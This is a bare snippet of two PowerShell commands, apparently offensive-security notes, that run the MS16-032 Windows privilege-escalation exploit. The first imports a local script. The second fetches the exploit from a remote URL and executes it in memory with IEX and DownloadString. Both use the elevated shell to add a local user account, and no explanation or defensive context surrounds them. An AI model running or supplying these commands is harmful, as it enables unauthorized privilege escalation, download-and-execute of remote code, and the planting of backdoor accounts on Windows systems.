powershell.exe -exec bypass -Command "& {Import-Module C:\windows\temp\Invoke-MS16-032.ps1;Invoke-MS16-032 -Application cmd.exe -Commandline '/c net user 1 1 / add'}" > C:\windows\temp\Invoke-MS16-032.log

OR

powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://sourcegraph.com/github.com/AA8j/PowerShell@main/-/raw/%E6%8F%90%E6%9D%83/MS16-032/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -Commandline '/c net user 1 1 / add'" > C:\windows\temp\Invoke-MS16-032.log
